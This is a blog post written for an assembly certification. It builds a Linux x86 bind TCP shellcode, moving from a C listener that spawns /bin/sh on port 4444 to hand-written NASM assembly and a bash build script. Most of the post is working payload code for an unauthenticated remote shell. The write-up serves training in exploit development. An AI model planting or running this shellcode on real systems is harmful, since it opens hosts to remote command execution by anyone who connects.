---
title:  "[SLAE 1] Bind TCP Shellcode"
---

![Logo](/assets/images/tux-root.png)

## Creating a basic bind TCP port shellcode

To create a bind TCP shellcode, I've first started with a small C program to do this and then analysed the system calls made by it. The following program listens for incoming connections and spawns a new shell: 
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
 
int main() {
    int listenfd = 0, connfd = 0;    
    int ret = 0;
 
    struct sockaddr_in serv_addr;
 
    // Create an un-named socket. returns socket descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);
 
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(4444);
 
    bind(listenfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
 
    // Listen on the created socket for maximum 1 client connection
    listen(listenfd, 1);
 
    // Sleep waiting for client requests
    connfd = accept(listenfd, (struct sockaddr*) NULL, NULL);
    printf("Created accept socket: %d\n", connfd);
 
    // Duplicate stdin, stdout, stderr
    ret = dup2(connfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(connfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(connfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args
 
    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }
 
    return 0;
}
```

We can test and see we get a shell: 
```bash
$ gcc -Wall shell_bind_tcp.c -o shell_bind_tcp
$ ./shell_bind_tcp  &
[1] 4528
$ nc -nvv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
Created accept socket: 4
whoami
liv
```

We then analyse the system calls necessary to bind the socket, listen for connections and execute the shell: 
```bash
$ strace ./shell_bind_tcp
[..]
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 1)                            = 0
accept(3, 0, NULL)                      = 4
dup2(4, 0)                              = 0...
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
```

The next step is to reproduce these system calls in assembly language and get the shellcode:

```c
; SLAE - Assignment 1
;
; Shell Bind TCP
;

global _start   

section .text
_start:

    ; Linux Syscall Reference
    ; http://syscalls.kernelgrok.com/


    ; 1. socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = listenfd
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    push ecx        ; NULL terminate args list
    mov cl, 6       ; IPPROTO_TCP (6)
    push ecx
    xor ecx, ecx
    mov cl, 1       ; SOCK_STREAM (1) - in socket.h
    push ecx
    xor ecx, ecx
    mov cl, 2       ; PF_INET (2) - IP PROTO FAMILY
    push ecx
    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 1       ; socketcall type of call: SYS_SOCKET (1) 
    push 102
    pop eax         ; socketcall syscall
    int 0x80
    mov edx, eax    ; listenfd is returned in eax. Save into edx    

    ; 2. bind(listenfd, {sa_family=AF_INET, sin_port=htons(4444), \
    ;       sin_addr=inet_addr("0.0.0.0")}, 16)
    ;struct sockaddr_in {
    ;    short            sin_family;   // e.g. AF_INET, AF_INET6
    ;    unsigned short   sin_port;     // e.g. htons(3490)
    ;    struct in_addr   sin_addr;     // see struct in_addr, below
    ;    char             sin_zero[8];  // zero this if you want to
    ;};
    ;struct in_addr {
    ;    unsigned long s_addr;          // load with inet_pton()
    ;};
    xor ecx, ecx    ; Construct sockaddr structure on the stack
    push ecx        ; inet_addr - 0.0.0.0 - INADDR_ANY
    push word <PORT>; 16 bits - port number
    push word 2     ; family - AF_INET (2)
    mov ecx, esp    ; pointer to args

    push byte 0x10  ; Address length - 16 bytes
    push ecx        ; Pointer to sockaddr_in structure
    push edx        ; listenfd from socket call

    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 2       ; socketcall type of call: SYS_BIND (2)
    xor eax, eax
    mov al, 102     ; socketcall syscall
    int 0x80

    ; 3. listen(listenfd, 1)
    push 1          ; max connections
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 4
    pop ebx         ; SYS_LISTEN (4)
    push 102
    pop eax         ; socketcall syscall
    int 0x80
 
    ; 4. accept(listenfd, 0, NULL) = connfd
    xor ecx, ecx
    push ecx        ; NULL
    push ecx        ; 0
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 5
    pop ebx         ; SYS_ACCEPT = 5
    push 102
    pop eax         ; socketcall syscall
    int 0x80        ; connfd will be in eax
    mov edx, eax    ; save new connection descriptor

    ; 5. dup2(connfd, 2), dup2(connfd, 1), dup2(connfd, 0)
    push 2
    pop ecx         ; ecx - newfd
    mov ebx, edx    ; edx - connfd, ebx - oldfd
    dup_loop:
    mov al, 63      ; dup2 syscall
    int 0x80
    dec ecx
    jns dup_loop    ; exit when signed (-1)
      
    ; 6. execve("/bin/sh", ["/bin/sh"], [/* 0 vars */])
 ; PUSH the first null dword 
 xor eax, eax
 push eax

    ; PUSH //bin/sh (8 bytes) 
 push 0x68732f2f ; 'hs//'
 push 0x6e69622f ; 'nib/
 mov ebx, esp    ; EBX - 1st param - NULL terminated filename

 push eax        ; EDX - 3rd param - NULL terminated list of env variables
 mov edx, esp    ; NULL terminator must be set before setting the 2nd param!

 push ebx        ; ECX - 2nd param - array of argument strings
 mov ecx, esp

 mov al, 11      ; execve syscall
 int 0x80
```

To make the port number easily configurable, I've made a bash wrapper, which replaces PORT with a command line argument and then assembles and links the asm source:

```bash
#!/bin/bash

PROG_NAME=shell_bind_tcp
EXPECTED_ARGS=1
E_BADARGS=10
E_BADPORT=11

# Check number of arguments
if [ $# -ne $EXPECTED_ARGS ]
then
  echo "Usage: `basename $0` {port}"
  exit $E_BADARGS
fi

# Check port number
echo $1 | grep -E -q '^[0-9]+$'
RETVAL=$?

if [ $RETVAL -eq 0 ] 
then 
    PORT=0x`printf "%04x" $1 | cut -b 3-4``printf "%04x" $1 | cut -b 1-2`
    echo '[+] Replacing port number with' $PORT
    sed "s/<PORT>/$PORT/g" $PROG_NAME.nasm > temp.nasm
else
    echo '[-] Bad port agument provided:' $1
    exit $E_BADPORT
fi

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o temp.o temp.nasm

echo '[+] Linking ...'
ld -z execstack -o $PROG_NAME temp.o

echo '[+] Cleaning ...'
rm -f temp.* *~

echo '[+] Done!'
```


##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
